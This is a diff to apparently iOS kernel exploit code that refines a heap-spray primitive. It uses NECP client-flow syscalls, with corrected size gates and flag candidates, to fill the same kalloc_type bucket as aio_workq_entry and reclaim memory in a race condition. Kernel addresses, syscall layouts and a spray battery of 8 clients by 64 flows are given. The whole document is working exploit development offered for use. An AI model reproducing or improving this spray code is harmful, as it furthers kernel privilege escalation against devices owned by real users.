@@ -4,8 +4,9 @@
 //  The reclaim-vehicle primitive for the aio close-race lane (T8). Every
 //  syscall offset + size gate is kernel-verified on 23F77 — findings
 //  2026-11-21_necp_client_flow_reclaim_path.md:
-//    - ADD buffer >= 0x801 (the reject window [1,0x800])
-//    - ADD_FLOW buffer >= 0xf1 (the reject window [0x23,0xf0])
+//    - ADD buffer in [1,0x800] (the 0x900 receipt: >=0x801 rejects)
+//    - ADD_FLOW buffer in [0x23,0xf0] (the inverted-gate receipt + the
+//      recipe decode; 0x24 = the exact fixed header)
 //    - client_id ptr len must be exactly 0x10
 //    - action lives in the LOW 32 bits of the second syscall arg
 //      (ldr w25,[x20,#8] @ 0xfffffff00a0c0494)
@@ -123,7 +124,7 @@ int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
     NLOG("=== p179 session %s BUILD %s ===",
          [LabLocalMilitaryNow() UTF8String] ?: "?", P179_BUILD.UTF8String);
     NLOG("%s", [LabDeviceProfile identBlock].UTF8String ?: "");
-    NLOG("NECP client-flow spray: necp_open(463) -> ADD(1, params>=0x801) -> ADD_FLOW(0x11, req>=0xf1).");
+    NLOG("NECP client-flow spray: necp_open(463,0) -> ADD(1, params in [1,0x800]) -> ADD_FLOW(0x11, req in [0x23,0xf0]).");
     NLOG("necp_client_flow = kalloc_type 0xb0 — the SAME 192-class bucket as aio_workq_entry (0xb8).");
     NLOG("PANIC-FREE. The shape matrix is the first-tap layout receipt.");
     NLOG("ABI: fd@+0x00, action@+0x08 (a1 low 32), cid_ptr@+0x10 (len 0x10), buffer@+0x20, size@+0x28.");
@@ -167,8 +168,14 @@ int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
         return out;
     }
 
-    /* 3. the flow shape matrix — 3 flags candidates × unique sockaddrs */
-    static const uint16_t fl_cand[3] = {0x40, 0x00, 0x41};
+    /* 3. the flow shape matrix — the recipe decode's candidates:
+       0x0000 = the GUARANTEED path (ret 0, one PERSISTENT flow per call —
+                the unconditional kalloc_type at 0xfffffff00a0b6394);
+       0x0004 = the site-0xa0c82e8 path (fires every call but TRANSIENT —
+                the assign-results walker ENOENTs unless req+0x00..0x0f is
+                a registered netagent uuid);
+       0x0040 = the old bit6 guess (kept as the control). */
+    static const uint16_t fl_cand[3] = {0x00, 0x04, 0x40};
     int best = -1;
     for (int k = 0; k < 3; k++) {
         uint8_t sa[16];
@@ -190,7 +197,10 @@ int necp179_add_flow(int fd, const uint8_t cid[16], const uint8_t sa[16],
         if (logfd >= 0) close(logfd);
         return out;
     }
-    NLOG("[3] working shape: flags=0x%02x (bit6 = the request-local sockaddr)", best);
+    NLOG("[3] working shape: flags=0x%02x %s", best,
+         best == 0x00 ? "(the GUARANTEED path — persistent flows, no netagent)" :
+         best == 0x04 ? "(the transient site-0xa0c82e8 path — netagent-gated)" :
+                        "(unmapped — the recipe file has the branch map)");
     NLOG("");
 
     /* 4. the volume battery — 8 clients x 64 flows, unique sockaddrs */
